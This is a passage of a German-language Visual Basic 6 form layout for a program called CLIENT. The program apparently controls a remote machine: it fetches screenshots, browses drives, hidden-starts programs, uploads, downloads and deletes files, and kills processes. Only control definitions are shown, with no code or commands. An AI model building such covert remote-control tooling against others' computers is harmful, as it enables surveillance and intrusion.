         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   45
         Left            =   5040
         TabIndex        =   142
         Top             =   6360
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Abschießen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":53CE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         Caption         =   "Anzahl: 0"
         Height          =   255
         Index           =   41
         Left            =   120
         TabIndex        =   143
         Top             =   6000
         Width           =   2535
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   51
      Left            =   3600
      TabIndex        =   161
      Top             =   0
      Width           =   7215
      Begin DMSliderControl.DMSlider Slider 
         Height          =   255
         Left            =   1560
         TabIndex        =   163
         Top             =   1920
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   450
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Border          =   1
         Caption         =   "Qualität"
         MaxValue        =   "100"
         HPicture        =   "frmMain.frx":53EA
         Mask            =   "false"
      End
      Begin MSComctlLib.ImageList ImageList4 
         Left            =   6480
         Top             =   4800
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   13
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":5688
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":58B8
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":5BF2
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":5E00
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":6124
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":6474
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":6866
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":6C18
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":707B
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":748E
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":76B3
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":78CC
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":7AF4
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   615
         Index           =   53
         Left            =   2160
         TabIndex        =   162
         Top             =   2400
         Width           =   2655
         _ExtentX        =   3836
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Screenshot abholen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":7ED9
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   19
      Left            =   3600
      TabIndex        =   117
      Top             =   0
      Width           =   7215
      Begin MSComDlg.CommonDialog CommonDialog1 
         Left            =   3120
         Top             =   4800
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin MSComctlLib.ImageList ImageList2 
         Left            =   6480
         Top             =   4800
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   13
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":7EF5
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":8125
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":845F
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":866D
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":8991
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":8CE1
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":90D3
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":9485
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":98E8
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":9CFB
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":9F20
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":A139
               Key             =   ""
            EndProperty
            BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frmMain.frx":A361
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   30
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   121
         Text            =   "C:/"
         Top             =   6720
         Width           =   6855
      End
      Begin VB.ComboBox Combo 
         Height          =   315
         Index           =   4
         Left            =   120
         Style           =   2  'Dropdown-Liste
         TabIndex        =   119
         Top             =   720
         Width           =   4335
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   28
         Left            =   120
         TabIndex        =   118
         Top             =   240
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Laufwerke abrufen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A746
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView ListFile 
         Height          =   5535
         Left            =   120
         TabIndex        =   120
         Top             =   1080
         Width           =   4335
         _ExtentX        =   7646
         _ExtentY        =   9763
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         HideColumnHeaders=   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList2"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   1
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   6879
         EndProperty
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   29
         Left            =   4560
         TabIndex        =   122
         Top             =   1080
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Laufwerkinfo"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A762
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   30
         Left            =   5880
         TabIndex        =   123
         Top             =   1080
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Aktualisieren"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A77E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   31
         Left            =   4560
         TabIndex        =   124
         Top             =   1680
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Starten"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A79A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   32
         Left            =   4560
         TabIndex        =   125
         Top             =   2160
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Hide Start"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A7B6
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   33
         Left            =   4560
         TabIndex        =   126
         Top             =   4080
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Umbenennen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A7D2
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   34
         Left            =   5880
         TabIndex        =   127
         Top             =   2160
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Löschen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A7EE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   35
         Left            =   4560
         TabIndex        =   128
         Top             =   2640
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Neuer Ordner"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A80A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   36
         Left            =   5880
         TabIndex        =   129
         Top             =   2640
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Ordner löschen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A826
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   37
         Left            =   4560
         TabIndex        =   130
         Top             =   3120
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Bild drucken"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A842
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   38
         Left            =   5880
         TabIndex        =   131
         Top             =   3120
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Als Hintergrund"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A85E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   39
         Left            =   4560
         TabIndex        =   132
         Top             =   4920
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Download"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A87A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   40
         Left            =   4560
         TabIndex        =   133
         Top             =   5400
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Upload"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A896
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   41
         Left            =   4560
         TabIndex        =   134
         Top             =   3600
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Dateigröße?"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A8B2
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   42
         Left            =   5880
         TabIndex        =   135
         Top             =   3600
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Anzeigen (Bild)"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A8CE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   43
         Left            =   5880
         TabIndex        =   136
         Top             =   1680
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "...."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A8EA
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   44
         Left            =   5880
         TabIndex        =   137
         Top             =   4080
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Suchen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A906
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label Label 
         Alignment       =   2  'Zentriert
         Caption         =   "0 Objekte vorhanden."
         Height          =   255
         Index           =   6
         Left            =   4560
         TabIndex        =   138
         Top             =   6360
         Width           =   2535
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   23
      Left            =   3600
      TabIndex        =   113
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   5445
         Index           =   32
         Left            =   360
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   114
         Top             =   360
         Width           =   6375
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   26
         Left            =   4320
         TabIndex        =   115
         Top             =   6000
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Lesen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A922
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin CLIENT.ChameleonButton Button 
         Height          =   375
         Index           =   27
         Left            =   360
         TabIndex        =   116
         Top             =   6000
         Width           =   2415
         _ExtentX        =   2778
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Setzen"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   14215660
         BCOLO           =   14215660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":A93E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   18
      Left            =   3600
      TabIndex        =   100
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   29
         Left            =   1920
         TabIndex        =   111
         Text            =   "Verdana"
         Top             =   1200
         Width           =   2055
      End
      Begin VB.TextBox Text 
         Height          =   285
         Index           =   28
         Left            =   1920
         TabIndex        =   110
         Text            =   "28"
         Top             =   1560
         Width           =   2055
      End
      Begin VB.CheckBox Check 
         Caption         =   "Durchgestrichen"
         Height          =   255
         Index           =   11
         Left            =   3600
         TabIndex        =   108
         Top             =   600
         Width           =   1695
      End
      Begin VB.CheckBox Check 
         Caption         =   "Unterstrichen"
         Height          =   255
         Index           =   10
         Left            =   1920
         TabIndex        =   107
         Top             =   600
         Width           =   1695
      End
      Begin VB.CheckBox Check 
         Caption         =   "Kursiv"
         Height          =   255
         Index           =   9
         Left            =   3600
         TabIndex        =   106
         Top             =   360
         Width           =   1695
      End
      Begin VB.CheckBox Check 
         Caption         =   "Fett"
